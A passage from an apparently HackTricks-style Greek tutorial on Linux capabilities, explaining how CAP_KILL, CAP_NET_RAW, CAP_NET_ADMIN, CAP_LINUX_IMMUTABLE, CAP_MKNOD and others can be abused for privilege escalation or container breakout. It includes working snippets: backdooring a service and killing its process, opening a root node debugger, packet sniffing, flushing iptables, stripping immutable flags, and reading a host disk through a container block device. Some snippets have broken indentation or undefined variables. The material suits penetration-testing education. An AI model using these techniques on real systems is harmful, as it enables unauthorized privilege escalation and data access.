Οι permitted capabilities του αρχείου περιορίζονται από το capability bounding set της διεργασίας, ενώ το effective bit του αρχείου ελέγχει αν το permitted set του αρχείου θα προστεθεί στο effective set της διεργασίας. Γι' αυτό η προσθήκη capabilities σε ένα αρχείο δεν καθιστά αυτόματα κάθε ζητούμενη capability usable κατά την εκτέλεση.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

Το [**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει αρκετές ευαίσθητες λειτουργίες, όπως πρόσβαση στα `/dev/mem`, `/dev/kmem` ή `/proc/kcore`, τροποποίηση του `mmap_min_addr`, πρόσβαση στα system calls `ioperm(2)` και `iopl(2)`, καθώς και διάφορες disk commands. Το `FIBMAP ioctl(2)` ενεργοποιείται επίσης μέσω αυτής της capability, γεγονός που έχει προκαλέσει προβλήματα στο [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Σύμφωνα με τη man page, αυτό επιτρέπει επίσης στον κάτοχο να εκτελεί μια σειρά από device-specific operations σε άλλες συσκευές.<sup>[[14]](#references)</sup>

Αυτό μπορεί να είναι χρήσιμο για **privilege escalation** και **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**Αυτή η capability παρακάμπτει τους permission checks για την αποστολή signals σε διεργασίες, στις περιπτώσεις που ορίζονται από τον kernel**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **`python`** binary διαθέτει αυτή την capability. Αν μπορούσατε **επίσης να τροποποιήσετε κάποιο service ή socket configuration** αρχείο (ή οποιοδήποτε configuration file σχετίζεται με ένα service), θα μπορούσατε να το κάνετε backdoor και στη συνέχεια να κάνετε kill τη διεργασία που σχετίζεται με αυτό το service και να περιμένετε να εκτελεστεί το νέο configuration file με το backdoor σας.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Αν έχετε capabilities για `kill` και υπάρχει ένα **node program running as root** (ή ως διαφορετικός χρήστης), πιθανότατα θα μπορούσατε να του **send** το **signal SIGUSR1** και να το κάνετε να **open the node debugger**, στον οποίο μπορείτε να συνδεθείτε.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Αυτή η capability επιτρέπει τη σύνδεση σε Internet ports κάτω από το 1024.** Δεν παρέχει άμεσα ευρύτερο privilege escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το **`python`** διαθέτει αυτή την capability, θα μπορεί να κάνει listen σε οποιοδήποτε port και ακόμη και να συνδεθεί από αυτό σε οποιοδήποτε άλλο port (ορισμένες υπηρεσίες απαιτούν συνδέσεις από ports με συγκεκριμένα privileges)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

Το [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε processes να **δημιουργούν RAW και PACKET sockets**, επιτρέποντάς τους να δημιουργούν και να στέλνουν αυθαίρετα network packets. Αυτό μπορεί να οδηγήσει σε κινδύνους ασφαλείας σε containerized environments, όπως packet spoofing, traffic injection και παράκαμψη network access controls. Κακόβουλοι actors θα μπορούσαν να το εκμεταλλευτούν για να παρέμβουν στο container routing ή να θέσουν σε κίνδυνο την ασφάλεια του host network, ειδικά χωρίς επαρκείς firewall protections. Επιπλέον, το **CAP_NET_RAW** υποστηρίζει λειτουργίες όπως το ping μέσω RAW ICMP requests.<sup>[[14]](#references)</sup>

**Αυτό μπορεί να επιτρέψει packet capture με κατάλληλο socket interface.** Δεν παρέχει άμεσα ευρύτερο privilege escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το binary **`tcpdump`** διαθέτει αυτήν τη capability, θα μπορείτε να το χρησιμοποιήσετε για να κάνετε capture network information.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Αν το **περιβάλλον** εκχωρεί αυτή τη δυνατότητα, το **`tcpdump`** μπορεί επίσης να τη χρησιμοποιήσει για να κάνει sniffing της κίνησης.<sup>[[14]](#references)</sup>

**Παράδειγμα με το binary 2**

Το ακόλουθο παράδειγμα είναι κώδικας **`python2`** που μπορεί να χρησιμοποιηθεί για την παρακολούθηση της κίνησης στη διεπαφή "**lo**" (**localhost**). Ο κώδικας προέρχεται από το lab "_The Basics: CAP-NET_BIND + NET_RAW_" στο [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει στον κάτοχο τη δυνατότητα να **τροποποιεί τις network configurations**, συμπεριλαμβανομένων των ρυθμίσεων firewall, των routing tables, των δικαιωμάτων socket και των ρυθμίσεων network interface μέσα στα εκτεθειμένα network namespaces. Επιτρέπει επίσης την ενεργοποίηση του **promiscuous mode** στα network interfaces, επιτρέποντας το packet sniffing μεταξύ namespaces.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **python binary** διαθέτει αυτές τις capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Αυτή η capability επιτρέπει την τροποποίηση flags του inode, όπως immutable και append-only.** Δεν παρέχει άμεσα ευρύτερο privilege escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν διαπιστώσετε ότι ένα αρχείο είναι immutable και το python διαθέτει αυτή την capability, μπορείτε να **αφαιρέσετε το immutable attribute και να κάνετε το αρχείο τροποποιήσιμο:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Οι λειτουργίες `FS_IOC_GETFLAGS` και `FS_IOC_SETFLAGS` διαβάζουν και ενημερώνουν τις σημαίες του inode· το `FS_IMMUTABLE_FL` είναι η immutable σημαία που διαγράφεται από αυτό το παράδειγμα.<sup>[[27]](#references)</sup>

> [!TIP]
> Σημειώστε ότι συνήθως αυτό το immutable attribute ορίζεται και αφαιρείται με:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

Το [**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση του system call `chroot(2)`, το οποίο μπορεί δυνητικά να επιτρέψει την έξοδο από περιβάλλοντα `chroot(2)` μέσω γνωστών vulnerabilities.<sup>[[11]](#references)[[14]](#references)</sup>

- [Πώς να ξεφύγετε από διάφορες λύσεις chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: tool για escape από chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

Το [**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση του system call `reboot(2)` για επανεκκινήσεις συστήματος, συμπεριλαμβανομένων commands όπως το `LINUX_REBOOT_CMD_RESTART2`· επίσης ενεργοποιεί τα `kexec_load(2)` και, από το Linux 3.17 και έπειτα, το `kexec_file_load(2)` για τη φόρτωση νέων ή signed crash kernels αντίστοιχα.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

Το [**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) διαχωρίστηκε από το ευρύτερο **CAP_SYS_ADMIN** στο Linux 2.6.37, παρέχοντας συγκεκριμένα τη δυνατότητα χρήσης του call `syslog(2)`. Αυτή η capability επιτρέπει την προβολή kernel addresses μέσω του `/proc` και παρόμοιων interfaces όταν η ρύθμιση `kptr_restrict` είναι στο 1, η οποία ελέγχει την έκθεση των kernel addresses. Από το Linux 2.6.39, η προεπιλεγμένη τιμή του `kptr_restrict` είναι 0, που σημαίνει ότι οι kernel addresses εκτίθενται, αν και πολλές distributions την ορίζουν στο 1 (απόκρυψη addresses εκτός από το uid 0) ή στο 2 (πάντα απόκρυψη addresses) για λόγους ασφάλειας.<sup>[[14]](#references)</sup>

Επιπλέον, το **CAP_SYSLOG** επιτρέπει την πρόσβαση στο output του `dmesg` όταν το `dmesg_restrict` είναι στο 1. Παρά αυτές τις αλλαγές, το **CAP_SYS_ADMIN** διατηρεί τη δυνατότητα εκτέλεσης λειτουργιών `syslog` λόγω ιστορικών προηγουμένων.<sup>[[14]](#references)</sup>

## CAP_MKNOD

Το [**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επεκτείνει τη λειτουργικότητα του system call `mknod` πέρα από τη δημιουργία regular files, FIFOs (named pipes) ή UNIX domain sockets. Συγκεκριμένα, επιτρέπει τη δημιουργία special files, τα οποία περιλαμβάνουν:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, δηλαδή devices όπως τα terminals.
- **S_IFBLK**: Block special files, δηλαδή devices όπως οι disks.

Αυτή η capability είναι χρήσιμη για processes που χρειάζεται να δημιουργούν device files, συμπεριλαμβανομένων character ή block devices.<sup>[[14]](#references)</sup>

Περιλαμβάνεται στο documented default capability set του Docker· επαληθεύστε την πραγματική runtime configuration αντί να υποθέτετε ότι κάθε deployment χρησιμοποιεί τα ίδια defaults ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Αυτή η capability επιτρέπει privilege escalations (μέσω full disk read) στο host, υπό τις εξής προϋποθέσεις:<sup>[[7]](#references)</sup>

1. Να έχετε αρχική πρόσβαση στο host (Unprivileged).
2. Να έχετε αρχική πρόσβαση στο container (Privileged (EUID 0) και effective `CAP_MKNOD`).
3. Το host και το container πρέπει να μοιράζονται το ίδιο user namespace.

**Βήματα για τη δημιουργία και πρόσβαση σε Block Device σε Container:**

1. **Στο Host ως Standard User:**

- Προσδιορίστε το τρέχον user ID σας με το `id`, π.χ. `uid=1000(standarduser)`.
- Εντοπίστε το target device, για παράδειγμα, το `/dev/sdb`.

2. **Μέσα στο Container ως `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Πίσω στον Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Αυτή η προσέγγιση επιτρέπει στον τυπικό χρήστη να αποκτήσει πρόσβαση και ενδεχομένως να διαβάσει δεδομένα από το `/dev/sdb` μέσω του container, όταν η συσκευή, τα namespaces και τα permissions έχουν ρυθμιστεί όπως περιγράφεται.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Σε τρέχοντες Linux kernels με file capabilities, το **`CAP_SETPCAP`** επιτρέπει σε ένα thread να προσθέτει capabilities από το bounding set του στο inheritable set του, να αφαιρεί capabilities από το bounding set του και να αλλάζει τα securebits του. Δεν επιτρέπει σε μια process να εκχωρεί αυθαίρετα capabilities σε άλλη process· αυτή η συμπεριφορά ισχύει μόνο για kernels πριν από την έκδοση 2.6.25, χωρίς υποστήριξη file capabilities.<sup>[[14]](#references)</sup>

Η system call `capset()` μπορεί να προσαρμόσει τα effective, permitted και inheritable sets ενός thread, αλλά το νέο permitted set δεν μπορεί να περιέχει capabilities εκτός του υπάρχοντος permitted set και οι ενημερώσεις του inheritable set εξακολουθούν να υπόκεινται σε περιορισμούς του kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Labs privilege escalation για Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation σε Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Βασικά στοιχεία Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Αξιοποίηση των Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Υπερβολικά Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Κατάχρηση πρόσβασης σε mount namespaces μέσω του /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Γιατί υπάρχουν και πώς λειτουργούν](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Κατανόηση των Capabilities στο Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC για παράκαμψη του seccomp όταν επιτρέπεται το ptrace](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Πώς να ξεφύγετε από διάφορες λύσεις chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - αρχικό exploit διαφυγής από Docker με CAP_DAC_READ_SEARCH από τον Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Ανάλυση exploit διαφυγής από Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Σελίδα εγχειριδίου του Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Εκτέλεση containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
